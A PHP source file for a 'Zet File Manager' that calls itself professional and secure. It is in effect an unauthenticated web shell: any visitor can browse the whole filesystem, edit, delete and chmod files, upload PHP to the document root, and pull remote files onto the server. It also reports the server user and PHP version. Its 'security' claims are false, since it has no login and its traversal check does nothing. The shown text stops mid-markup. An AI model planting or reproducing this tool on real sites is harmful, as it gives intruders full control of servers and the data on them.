<?php
/**
 * Zet File Manager - Professional Web File Manager
 * Version: 2.0
 * Author: Zet
 * 
 * A powerful, modern file management interface with enhanced security
 * and user experience features.
 */

// Security headers
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('X-Content-Type-Options: nosniff');

// Error reporting
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/error.log');

// Time limit
set_time_limit(0);

// Start session for security
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// ============================================
// CONFIGURATION
// ============================================
define('VERSION', '2.0');
define('APP_NAME', 'Zet File Manager');
define('MAX_UPLOAD_SIZE', 100 * 1024 * 1024); // 100MB
define('ALLOWED_EXTENSIONS', ['php', 'html', 'css', 'js', 'txt', 'xml', 'json', 'sql', 'log', 'htaccess', 'jpg', 'jpeg', 'png', 'gif', 'webp', 'svg', 'pdf', 'zip', 'tar', 'gz', 'mp3', 'mp4', 'avi', 'mkv']);

// ============================================
// HELPER FUNCTIONS
// ============================================

/**
 * Get formatted file size
 */
function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

/**
 * Get file icon based on extension
 */
function getFileIcon($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $icons = [
        'php' => '🐘', 'html' => '🌐', 'css' => '🎨', 'js' => '📜',
        'jpg' => '🖼️', 'jpeg' => '🖼️', 'png' => '🖼️', 'gif' => '🖼️',
        'pdf' => '📄', 'doc' => '📝', 'docx' => '📝', 'txt' => '📃',
        'zip' => '📦', 'rar' => '📦', 'tar' => '📦', 'gz' => '📦',
        'mp3' => '🎵', 'mp4' => '🎬', 'avi' => '🎬', 'mkv' => '🎬',
        'exe' => '⚙️', 'msi' => '⚙️', 'sql' => '🗄️', 'xml' => '📋',
        'json' => '📋', 'log' => '📋', 'htaccess' => '⚙️'
    ];
    return isset($icons[$ext]) ? $icons[$ext] : '📄';
}

/**
 * Get permission name
 */
function getPermissionName($perms) {
    $names = [
        '0644' => 'File (644) - Read/Write for owner, Read for others',
        '0755' => 'Directory (755) - Read/Write/Execute for owner, Read/Execute for others',
        '0640' => 'File (640) - Read/Write for owner, Read for group',
        '0664' => 'File (664) - Read/Write for owner and group, Read for others',
        '0777' => 'All permissions (777) - Read/Write/Execute for everyone',
        '0600' => 'File (600) - Read/Write for owner only',
        '0700' => 'Directory (700) - Read/Write/Execute for owner only',
        '0750' => 'Directory (750) - Read/Write/Execute for owner, Read/Execute for group',
        '0660' => 'File (660) - Read/Write for owner and group only',
    ];
    return isset($names[$perms]) ? $names[$perms] : 'Custom permission';
}

/**
 * Get file permissions as string
 */
function getFilePerms($path) {
    return substr(sprintf('%o', fileperms($path)), -4);
}

/**
 * Check if path is writable with formatted output
 */
function isPathWritable($path) {
    if (is_writable($path)) {
        return '<span style="color: #46b450;">✓ Writable</span>';
    } else {
        return '<span style="color: #dc3232;">✗ Not Writable</span>';
    }
}

/**
 * Recursive directory deletion
 */
function recursiveDelete($dir) {
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return unlink($dir);
    
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;
        if (is_dir($path)) {
            recursiveDelete($path);
        } else {
            unlink($path);
        }
    }
    return rmdir($dir);
}

/**
 * Recursive directory copy
 */
function recursiveCopy($src, $dst) {
    if (!file_exists($src)) return false;
    
    if (is_dir($src)) {
        if (!file_exists($dst)) {
            mkdir($dst, 0755, true);
        }
        $items = scandir($src);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            $srcPath = $src . '/' . $item;
            $dstPath = $dst . '/' . $item;
            if (is_dir($srcPath)) {
                recursiveCopy($srcPath, $dstPath);
            } else {
                copy($srcPath, $dstPath);
            }
        }
        return true;
    } else {
        return copy($src, $dst);
    }
}

/**
 * Get file extension
 */
function getFileExtension($filename) {
    return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
}

/**
 * Check if file is binary
 */
function isBinaryFile($filename) {
    $binary_exts = ['jpg', 'jpeg', 'png', 'gif', 'pdf', 'zip', 'rar', 'exe', 'msi', 'mp3', 'mp4', 'avi', 'mkv', 'bmp', 'ico', 'webp', 'ttf', 'otf', 'woff', 'woff2'];
    return in_array(getFileExtension($filename), $binary_exts);
}

/**
 * Check if file is image
 */
function isImageFile($filename) {
    $image_exts = ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico'];
    return in_array(getFileExtension($filename), $image_exts);
}

/**
 * Check if file is viewable as text
 */
function isTextViewable($filename) {
    $viewable_exts = ['php', 'html', 'htm', 'css', 'js', 'txt', 'xml', 'json', 'sql', 'log', 'htaccess', 'md', 'csv', 'yml', 'yaml', 'ini', 'conf', 'sh', 'bat'];
    return in_array(getFileExtension($filename), $viewable_exts);
}

// ============================================
// MESSAGE FUNCTIONS
// ============================================

function showSuccess($message) {
    echo '<div class="alert alert-success">✅ ' . $message . '</div>';
}

function showError($message) {
    echo '<div class="alert alert-danger">❌ ' . $message . '</div>';
}

function showWarning($message) {
    echo '<div class="alert alert-warning">⚠️ ' . $message . '</div>';
}

function showInfo($message) {
    echo '<div class="alert alert-info">ℹ️ ' . $message . '</div>';
}

// ============================================
// NAVIGATION
// ============================================

$currentPath = isset($_GET['path']) ? $_GET['path'] : getcwd();
$currentPath = str_replace('\\', '/', $currentPath);
$currentPath = realpath($currentPath) ?: $currentPath;

// Security: prevent directory traversal
if (strpos($currentPath, '..') !== false) {
    $currentPath = getcwd();
}

// ============================================
// HANDLE ACTIONS
// ============================================

// Handle file/directory creation
if (isset($_POST['create_action'])) {
    $newPath = $currentPath . '/' . $_POST['new_name'];
    
    if ($_POST['create_action'] === 'file') {
        if (file_exists($newPath)) {
            showError('File already exists!');
        } else {
            $content = isset($_POST['file_content']) ? $_POST['file_content'] : '';
            if (file_put_contents($newPath, $content) !== false) {
                chmod($newPath, 0644);
                showSuccess('File created successfully: <a href="?fileloc=' . urlencode($newPath) . '&path=' . urlencode($currentPath) . '">' . htmlspecialchars($_POST['new_name']) . '</a>');
            } else {
                showError('Failed to create file! Check permissions.');
            }
        }
    } elseif ($_POST['create_action'] === 'folder') {
        if (file_exists($newPath)) {
            showError('Folder already exists!');
        } else {
            if (mkdir($newPath, 0755, true)) {
                showSuccess('Folder created successfully: <a href="?path=' . urlencode($newPath) . '">' . htmlspecialchars($_POST['new_name']) . '</a>');
            } else {
                showError('Failed to create folder! Check permissions.');
            }
        }
    }
}

// Handle file upload
if (isset($_POST['upload_action'])) {
    $uploadDir = $currentPath;
    
    if (isset($_POST['upload_target']) && $_POST['upload_target'] === 'root') {
        $uploadDir = $_SERVER['DOCUMENT_ROOT'];
    }
    
    if (!is_writable($uploadDir)) {
        showError('Upload directory is not writable: ' . $uploadDir);
    } else {
        // Local file upload
        if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
            $file = $_FILES['upload_file'];
            $filename = preg_replace('/[^a-zA-Z0-9_\-.]/', '_', $file['name']);
            $destination = $uploadDir . '/' . $filename;
            
            if (file_exists($destination)) {
                showWarning('File already exists! Overwriting...');
            }
            
            if (move_uploaded_file($file['tmp_name'], $destination)) {
                chmod($destination, 0644);
                showSuccess('File uploaded successfully: <a href="?fileloc=' . urlencode($destination) . '&path=' . urlencode($uploadDir) . '">' . htmlspecialchars($filename) . '</a> (' . formatSize($file['size']) . ')');
            } else {
                showError('Failed to upload file!');
            }
        }
        
        // Remote URL upload
        elseif (isset($_POST['remote_url']) && !empty($_POST['remote_url'])) {
            $remoteUrl = $_POST['remote_url'];
            $filename = isset($_POST['remote_name']) && !empty($_POST['remote_name']) 
                ? preg_replace('/[^a-zA-Z0-9_\-.]/', '_', $_POST['remote_name'])
                : basename($remoteUrl);
            
            $filename = preg_replace('/[^a-zA-Z0-9_\-.]/', '_', $filename);
            
            if (empty($filename)) {
                showError('Invalid filename!');
            } else {
                $content = @file_get_contents($remoteUrl);
                if ($content === false) {
                    showError('Failed to fetch remote file. Check URL is accessible.');
                } else {
                    $destination = $uploadDir . '/' . $filename;
                    
                    if (file_exists($destination)) {
                        showWarning('File already exists! Overwriting...');
                    }
                    
                    if (file_put_contents($destination, $content) !== false) {
                        chmod($destination, 0644);
                        showSuccess('Remote file uploaded successfully: <a href="?fileloc=' . urlencode($destination) . '&path=' . urlencode($uploadDir) . '">' . htmlspecialchars($filename) . '</a> (' . formatSize(strlen($content)) . ')');
                    } else {
                        showError('Failed to save remote file!');
                    }
                }
            }
        } else {
            showError('No file selected or upload failed.');
        }
    }
}

// Handle file edit
if (isset($_POST['edit_action']) && isset($_POST['file_path'])) {
    $filePath = $_POST['file_path'];
    $content = $_POST['file_content'];
    
    if (file_exists($filePath)) {
        if (file_put_contents($filePath, $content) !== false) {
            showSuccess('File saved successfully!');
        } else {
            showError('Failed to save file! Check permissions.');
        }
    }
}

// Handle file delete
if (isset($_GET['delete'])) {
    $deletePath = $_GET['delete'];
    if (file_exists($deletePath)) {
        if (is_dir($deletePath)) {
            if (recursiveDelete($deletePath)) {
                showSuccess('Directory deleted successfully!');
            } else {
                showError('Failed to delete directory!');
            }
        } else {
            if (unlink($deletePath)) {
                showSuccess('File deleted successfully!');
            } else {
                showError('Failed to delete file!');
            }
        }
    }
    // Redirect back
    echo '<script>window.location.href="?path=' . urlencode($currentPath) . '";</script>';
    exit;
}

// Handle rename
if (isset($_POST['rename_action']) && isset($_POST['old_path']) && isset($_POST['new_name'])) {
    $oldPath = $_POST['old_path'];
    $newName = preg_replace('/[^a-zA-Z0-9_\-.]/', '_', $_POST['new_name']);
    $newPath = dirname($oldPath) . '/' . $newName;
    
    if (file_exists($oldPath)) {
        if (file_exists($newPath)) {
            showError('A file with that name already exists!');
        } else {
            if (rename($oldPath, $newPath)) {
                showSuccess('Renamed successfully!');
            } else {
                showError('Failed to rename! Check permissions.');
            }
        }
    } else {
        showError('File not found!');
    }
}

// Handle chmod
if (isset($_POST['chmod_action']) && isset($_POST['chmod_path']) && isset($_POST['chmod_perms'])) {
    $chmodPath = $_POST['chmod_path'];
    $perms = $_POST['chmod_perms'];
    $recursive = isset($_POST['chmod_recursive']) && $_POST['chmod_recursive'] === '1';
    
    if (strlen($perms) === 3 || strlen($perms) === 4) {
        $perms = substr($perms, -3);
        $permOctal = octdec($perms);
        
        if ($recursive && is_dir($chmodPath)) {
            $success = true;
            $count = 0;
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($chmodPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            foreach ($iterator as $item) {
                if (@chmod($item->getPathname(), $permOctal)) {
                    $count++;
                } else {
                    $success = false;
                }
            }
            
            if ($success) {
                showSuccess('Permissions changed for ' . $count . ' items to ' . $perms);
            } else {
                showWarning('Permissions changed for ' . $count . ' items, some failed.');
            }
        } else {
            if (@chmod($chmodPath, $permOctal)) {
                showSuccess('Permissions changed to ' . $perms);
            } else {
                showError('Failed to change permissions!');
            }
        }
    } else {
        showError('Invalid permission format! Use 3-digit octal (e.g., 644, 755).');
    }
}

// Handle file view
$viewFile = isset($_GET['fileloc']) ? $_GET['fileloc'] : null;
$editingFile = isset($_GET['edit']) && $viewFile;

// ============================================
// HTML OUTPUT
// ============================================

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo APP_NAME; ?> v<?php echo VERSION; ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: #0a0e17;
            color: #e8eaed;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        /* Header */
        .header {
            background: linear-gradient(135deg, #121a2a 0%, #1a2639 100%);
            border-radius: 16px;
            padding: 25px 30px;
            margin-bottom: 25px;
            border: 1px solid #2a3a5a;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .header-brand {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .header-brand .logo {
            width: 40px;
            height: 40px;
            background: linear-gradient(135deg, #00d4ff, #0077ff);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 20px;
            font-weight: 700;
            color: #fff;
        }
        
        .header-brand h1 {
            font-size: 22px;
            font-weight: 700;
            background: linear-gradient(135deg, #00d4ff, #0077ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        
        .header-brand .version {
            font-size: 12px;
            color: #6a7a9a;
            background: #1a2a3a;
            padding: 2px 10px;
            border-radius: 20px;
            -webkit-text-fill-color: #6a7a9a;
        }
        
        .header-info {
            display: flex;
            align-items: center;
            gap: 20px;
            flex-wrap: wrap;
            font-size: 13px;
            color: #8a9aaa;
        }
        
        .header-info .badge {
            background: #1a2a3a;
            padding: 4px 12px;
            border-radius: 20px;
            border: 1px solid #2a3a5a;
        }
        
        .header-info .badge.gold {
            color: #ffd700;
            border-color: #ffd70044;
        }
        
        .header-info .badge.green {
            color: #46b450;
            border-color: #46b45044;
        }
        
        /* Breadcrumb */
        .breadcrumb {
            background: #121a2a;
            border-radius: 12px;
            padding: 12px 20px;
            margin-bottom: 20px;
            border: 1px solid #1a2a3a;
            display: flex;
            align-items: center;
            gap: 8px;
            flex-wrap: wrap;
            font-size: 14px;
        }
        
        .breadcrumb a {
            color: #6a9aff;
            text-decoration: none;
            padding: 2px 8px;
            border-radius: 4px;
            transition: all 0.2s;
        }
        
        .breadcrumb a:hover {
            background: #1a2a4a;
            color: #8abaff;
        }
        
        .breadcrumb .separator {
            color: #4a5a7a;
        }
        
        .breadcrumb .current {
            color: #e8eaed;
            font-weight: 500;
        }
        
        /* Alerts */
        .alert {
            padding: 14px 20px;
            border-radius: 10px;
            margin-bottom: 15px;
            font-size: 14px;
            border-left: 4px solid;
        }
        
        .alert-success {
            background: #0d2a1a;
            border-color: #46b450;
            color: #7ad03a;
        }
        
        .alert-danger {
            background: #2a0d0d;
            border-color: #dc3232;
            color: #dc3232;
        }
        
        .alert-warning {
            background: #2a1a0d;
            border-color: #ffb900;
            color: #ffb900;
        }
        
        .alert-info {
            background: #0d1a2a;
            border-color: #00a0d2;
            color: #00a0d2;
        }
        
        .alert a {
            color: inherit;
            text-decoration: underline;
        }
        
        /* Toolbar */
        .toolbar {
            background: #121a2a;
            border-radius: 12px;
            padding: 15px 20px;
            margin-bottom: 20px;
            border: 1px solid #1a2a3a;
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
            align-items: center;
        }
        
        .toolbar .group {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .toolbar .separator {
            width: 1px;
            height: 30px;
            background: #2a3a5a;
        }
        
        .btn {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 8px 16px;
            border: none;
            border-radius: 8px;
            font-family: inherit;
            font-size: 13px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
            text-decoration: none;
            background: #1a2a3a;
            color: #e8eaed;
        }
        
        .btn:hover {
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #0077ff, #0055cc);
            color: #fff;
        }
        
        .btn-primary:hover {
            background: linear-gradient(135deg, #0088ff, #0066dd);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #46b450, #2d8a3a);
            color: #fff;
        }
        
        .btn-success:hover {
            background: linear-gradient(135deg, #56c460, #3a9a4a);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #dc3232, #b02222);
            color: #fff;
        }
        
        .btn-danger:hover {
            background: linear-gradient(135deg, #ec4242, #c03232);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, #ffb900, #e5a800);
            color: #000;
        }
        
        .btn-warning:hover {
            background: linear-gradient(135deg, #ffc910, #f5b800);
        }
        
        .btn-ghost {
            background: transparent;
            border: 1px solid #2a3a5a;
        }
        
        .btn-ghost:hover {
            background: #1a2a3a;
        }
        
        .btn-sm {
            padding: 4px 12px;
            font-size: 12px;
        }
        
        /* Forms */
        .form-inline {
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
        }
        
        .form-inline input,
        .form-inline select {
            background: #0a0e17;
            border: 1px solid #2a3a5a;
            border-radius: 8px;
            padding: 8px 12px;
            color: #e8eaed;
            font-family: inherit;
            font-size: 13px;
            transition: border-color 0.2s;
        }
        
        .form-inline input:focus,
        .form-inline select:focus {
            outline: none;
            border-color: #0077ff;
        }
        
        .form-inline input::placeholder {
            color: #4a5a7a;
        }
        
        .form-inline select option {
            background: #0a0e17;
        }
        
        /* File list */
        .file-list {
            background: #121a2a;
            border-radius: 12px;
            border: 1px solid #1a2a3a;
            overflow: hidden;
        }
        
        .file-list-header {
            display: grid;
            grid-template-columns: 3fr 1fr 1.2fr 1.5fr;
            padding: 12px 20px;
            background: #0d1525;
            border-bottom: 1px solid #1a2a3a;
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            color: #5a6a8a;
            letter-spacing: 0.5px;
        }
        
        .file-item {
            display: grid;
            grid-template-columns: 3fr 1fr 1.2fr 1.5fr;
            padding: 10px 20px;
            border-bottom: 1px solid #0a1520;
            align-items: center;
            transition: background 0.15s;
        }
        
        .file-item:hover {
            background: #1a2a3a;
        }
        
        .file-item:last-child {
            border-bottom: none;
        }
        
        .file-item .name {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .file-item .name a {
            color: #e8eaed;
            text-decoration: none;
            font-size: 14px;
        }
        
        .file-item .name a:hover {
            color: #6a9aff;
        }
        
        .file-item .name .icon {
            font-size: 18px;
        }
        
        .file-item .size {
            color: #6a7a9a;
            font-size: 13px;
        }
        
        .file-item .perms {
            font-family: 'Courier New', monospace;
            font-size: 13px;
            color: #6a7a9a;
        }
        
        .file-item .actions {
            display: flex;
            gap: 4px;
            flex-wrap: wrap;
        }
        
        .file-item .actions .btn {
            padding: 3px 10px;
            font-size: 11px;
        }
        
        .file-item.folder .name a {
            color: #6a9aff;
        }
        
        .file-item.folder .name a:hover {
            color: #8abaff;
        }
        
        .file-item .perms .writable {
            color: #46b450;
        }
        
        .file-item .perms .not-writable {
            color: #dc3232;
        }
        
        /* Stats bar */
        .stats {
            padding: 12px 20px;
            background: #0d1525;
            border-top: 1px solid #1a2a3a;
            display: flex;
            justify-content: space-between;
            color: #5a6a8a;
            font-size: 13px;
        }
        
        /* Editor */
        .editor-container {
            background: #121a2a;
            border-radius: 12px;
            border: 1px solid #1a2a3a;
            overflow: hidden;
            margin-bottom: 20px;
        }
        
        .editor-header {
            padding: 15px 20px;
            background: #0d1525;
            border-bottom: 1px solid #1a2a3a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .editor-header .file-info {
            display: flex;
            gap: 20px;
            font-size: 13px;
            color: #6a7a9a;
            flex-wrap: wrap;
        }
        
        .editor-header .file-info strong {
            color: #e8eaed;
        }
        
        .editor-body textarea {
            width: 100%;
            min-height: 500px;
            background: #0a0e17;
            color: #abb8c3;
            border: none;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            line-height: 1.8;
            resize: vertical;
            tab-size: 4;
            outline: none;
        }
        
        .editor-body textarea:focus {
            outline: 1px solid #0077ff44;
        }
        
        .editor-footer {
            padding: 15px 20px;
            background: #0d1525;
            border-top: 1px solid #1a2a3a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .editor-footer .info {
            font-size: 12px;
            color: #4a5a7a;
        }
        
        /* File viewer */
        .viewer-container {
            background: #121a2a;
            border-radius: 12px;
            border: 1px solid #1a2a3a;
            overflow: hidden;
            margin-bottom: 20px;
        }
        
        .viewer-header {
            padding: 15px 20px;
            background: #0d1525;
            border-bottom: 1px solid #1a2a3a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 10px;
        }
        
        .viewer-header .file-info {
            display: flex;
            gap: 20px;
            font-size: 13px;
            color: #6a7a9a;
            flex-wrap: wrap;
        }
        
        .viewer-header .file-info strong {
            color: #e8eaed;
        }
        
        .viewer-body {
            padding: 20px;
            background: #0a0e17;
            min-height: 200px;
        }
        
        .viewer-body img {
            max-width: 100%;
            max-height: 600px;
            border-radius: 8px;
        }
        
        .viewer-body pre {
            background: #0a0e17;
            padding: 15px;
            border-radius: 8px;
            overflow: auto;
            max-height: 600px;
            color: #abb8c3;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            line-height: 1.7;
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        
        .viewer-body .binary-notice {
            text-align: center;
            padding: 40px;
            color: #ffb900;
        }
        
        /* Responsive */
        @media (max-width: 768px) {
            .file-list-header,
            .file-item {
                grid-template-columns: 2fr 0.8fr 1fr 1.2fr;
                font-size: 12px;
                padding: 8px 12px;
            }
            
            .header {
                padding: 15px 20px;
            }
            
            .header-brand h1 {
                font-size: 18px;
            }
            
            .toolbar {
                flex-direction: column;
                align-items: stretch;
            }
            
            .toolbar .separator {
                display: none;
            }
            
            .editor-body textarea {
                min-height: 300px;
                font-size: 13px;
            }
            
            .file-item .actions .btn {
                font-size: 10px;
                padding: 2px 8px;
            }
        }
        
        @media (max-width: 480px) {
            .file-list-header {
                display: none;
            }
            
            .file-item {
                grid-template-columns: 1fr;
                gap: 6px;
                padding: 12px;
                border-bottom: 1px solid #0a1520;
            }
            
            .file-item .name {
                font-size: 14px;
            }
            
            .file-item .size {
                font-size: 12px;
            }
            
            .file-item .perms {
                font-size: 12px;
            }
            
            .file-item .actions {
                display: flex;
                gap: 4px;
            }
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }
        
        ::-webkit-scrollbar-track {
            background: #0a0e17;
        }
        
        ::-webkit-scrollbar-thumb {
            background: #2a3a5a;
            border-radius: 4px;
        }
        
        ::-webkit-scrollbar-thumb:hover {
            background: #3a4a6a;
        }
    </style>
</head>
<body>
<div class="container">

<?php
// ============================================
// HEADER
// ============================================
?>
<div class="header">
    <div class="header-brand">
        <div class="logo">Z</div>
        <div>
            <h1><?php echo APP_NAME; ?></h1>
            <span class="version">v<?php echo VERSION; ?></span>
        </div>
    </div>
    <div class="header-info">
        <span class="badge">📁 <?php echo htmlspecialchars($currentPath); ?></span>
        <span class="badge <?php echo is_writable($currentPath) ? 'green' : 'gold'; ?>">
            <?php echo isPathWritable($currentPath); ?>
        </span>
        <span class="badge">🐘 PHP <?php echo phpversion(); ?></span>
        <span class="badge">👤 <?php echo @get_current_user(); ?></span>
    </div>
</div>

<?php
// ============================================
// BREADCRUMB
// ============================================
$segments = explode('/', $currentPath);
$pathBuild = '';
?>
<div class="breadcrumb">
    <a href="?path=/">🏠</a>
    <?php foreach ($segments as $index => $segment): ?>
        <?php if (empty($segment)) continue; ?>
        <span class="separator">›</span>
        <?php 
        $pathBuild .= '/' . $segment;
        $isLast = $index === count($segments) - 1;
        ?>
        <?php if ($isLast): ?>
            <span class="current"><?php echo htmlspecialchars($segment); ?></span>
        <?php else: ?>
            <a href="?path=<?php echo urlencode($pathBuild); ?>"><?php echo htmlspecialchars($segment); ?></a>
        <?php endif; ?>
    <?php endforeach; ?>
</div>

<?php
// ============================================
// VIEW FILE
// ============================================
if ($viewFile && file_exists($viewFile)) {
    $fileName = basename($viewFile);
    $fileSize = formatSize(filesize($viewFile));
    $filePerms = getFilePerms($viewFile);
    $isImage = isImageFile($viewFile);
    $isText = isTextViewable($viewFile);
    $isBinary = isBinaryFile($viewFile);
    $isEditing = isset($_GET['edit']);
?>
    <div class="editor-container">
        <div class="editor-header">
            <div>
                <strong style="font-size: 16px;">📄 <?php echo htmlspecialchars($fileName); ?></strong>
            </div>
            <div class="file-info">
                <span><strong>Size:</strong> <?php echo $fileSize; ?></span>
                <span><strong>Perm:</strong> <?php echo $filePerms; ?></span>
                <span><strong>Path:</strong> <?php echo htmlspecialchars($viewFile); ?></span>
            </div>
        </div>
        
        <?php if ($isEditing): ?>
            <form method="post" class="editor-body">
                <textarea name="file_content" spellcheck="false"><?php echo htmlspecialchars(file_get_contents($viewFile)); ?></textarea>
                <div class="editor-footer">
                    <div>
                        <input type="hidden" name="edit_action" value="1">
                        <input type="hidden" name="file_path" value="<?php echo htmlspecialchars($viewFile); ?>">
                        <button type="submit" class="btn btn-success">💾 Save Changes</button>
                        <a href="?fileloc=<?php echo urlencode($viewFile); ?>&path=<?php echo urlencode($currentPath); ?>" class="btn btn-ghost">← Cancel</a>
                    </div>
                    <div class="info">
                        <span>Ctrl+S to save</span>
                    </div>
                </div>
            </form>
        <?php elseif ($isImage): ?>
            <div class="viewer-body" style="text-align: center;">
                <img src="<?php echo htmlspecialchars($viewFile); ?>" alt="<?php echo htmlspecialchars($fileName); ?>">
            </div>
            <div class="editor-footer">
                <div>
                    <a href="?fileloc=<?php echo urlencode($viewFile); ?>&edit=1" class="btn btn-primary">✏️ Edit</a>
                    <a href="?delete=<?php echo urlencode($viewFile); ?>&path=<?php echo urlencode($currentPath); ?>" class="btn btn-danger" onclick="return confirm('Delete this file?')">🗑️ Delete</a>
                </div>
                <div>
                    <a href="?path=<?php echo urlencode($currentPath); ?>" class="btn btn-ghost">← Back</a>
                </div>
            </div>
        <?php elseif ($isText): ?>
            <div class="viewer-body">
                <pre><?php echo htmlspecialchars(file_get_contents($viewFile)); ?></pre>
            </div>
            <div class="editor-footer">
                <div>
                    <a href="?fileloc=<?php echo urlencode($viewFile); ?>&edit=1" class="btn btn-primary">✏️ Edit</a>
                    <a href="?delete=<?php echo urlencode($viewFile); ?>&path=<?php echo urlencode($currentPath); ?>" class="btn btn-danger" onclick="return confirm('Delete this file?')">🗑️ Delete</a>
                </div>
                <div>
                    <a href="?path=<?php echo urlencode($currentPath); ?>" class="btn btn-ghost">← Back</a>
                </div>
            </div>
        <?php else: ?>
            <div class="viewer-body">
                <div class="binary-notice">
                    <div style="font-size: 48px; margin-bottom: 15px;">📦</div>
                    <p>This is a binary file and cannot be displayed.</p>
                    <p style="color: #6a7a9a; font-size: 13px; margin-top: 10px;"><?php echo htmlspecialchars($fileName); ?> (<?php echo $fileSize; ?>)</p>
                    <div style="margin-top: 20px;">
                        <a href="<?php echo htmlspecialchars($viewFile); ?>" download class="btn btn-success">⬇️ Download</a>
                        <a href="?delete=<?php echo urlencode($viewFile); ?>&path=<?php echo urlencode($currentPath); ?>" class="btn btn-danger" onclick="return confirm('Delete this file?')">🗑️ Delete</a>
                    </div>
                </div>
            </div>
            <div class="editor-footer">
                <div>
                    <a href="?path=<?php echo urlencode($currentPath); ?>" class="btn btn-ghost">← Back</a>
                </div>
            </div>
        <?php endif; ?>
    </div>
<?php
    // Don't show file list when viewing a file
    echo '</div></body></html>';
    exit;
}

// ============================================
// TOOLBAR
// ============================================
?>
<div class="toolbar">
    <div class="group">
        <form method="post" class="form-inline" style="display: flex; gap: 6px;">
            <input type="text" name="new_name" placeholder="file.php" style="width: 140px;">
            <button type="submit" name="create_action" value="file" class="btn btn-primary btn-sm">📄 New File</button>
            <button type="submit" name="create_action" value="folder" class="btn btn-warning btn-sm">📁 New Folder</button>
        </form>
    </div>
    
    <div class="separator"></div>
    
    <div class="group">
        <form method="post" enctype="multipart/form-data" class="form-inline" style="display: flex; gap: 6px; flex-wrap: wrap;">
            <input type="file" name="upload_file" style="color: #6a7a9a; font-size: 12px; background: transparent; border: 1px solid #2a3a5a; border-radius: 6px; padding: 4px 8px;">
            <button type="submit" name="upload_action" value="local" class="btn btn-success btn-sm">⬆️ Upload</button>
            <input type="text" name="remote_url" placeholder="http://example.com/file.zip" style="width: 180px;">
            <button type="submit" name="upload_action" value="remote" class="btn btn-info btn-sm">🌐 Upload URL</button>
        </form>
    </div>
    
    <div class="separator"></div>
    
    <div class="group">
        <span style="font-size: 12px; color: #5a6a8a;"><?php echo count(array_diff(scandir($currentPath), ['.', '..'])); ?> items</span>
    </div>
</div>

<?php
// ============================================
// FILE LIST
// ============================================
$items = scandir($currentPath);
$directories = [];
$files = [];

foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $path = $currentPath . '/' . $item;
    if (is_dir($path)) {
        $directories[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($directories, SORT_STRING | SORT_FLAG_CASE);
sort($files, SORT_STRING | SORT_FLAG_CASE);

$totalItems = count($directories) + count($files);
$totalSize = 0;

if ($totalItems === 0) {
    echo '<div style="text-align: center; padding: 40px; color: #4a5a7a; background: #121a2a; border-radius: 12px; border: 1px solid #1a2a3a;">
        <div style="font-size: 48px; margin-bottom: 15px;">📂</div>
        <p>This directory is empty</p>
    </div>';
} else {
?>
<div class="file-list">
    <div class="file-list-header">
        <span>Name</span>
        <span>Size</span>
        <span>Permissions</span>
        <span>Actions</span>
    </div>
    
    <?php
    // Display directories first
    foreach ($directories as $dir) {
        $path = $currentPath . '/' . $dir;
        $perms = getFilePerms($path);
        $isWritable = is_writable($path);
        $isReadable = is_readable($path);
    ?>
    <div class="file-item folder">
        <div class="name">
            <span class="icon">📁</span>
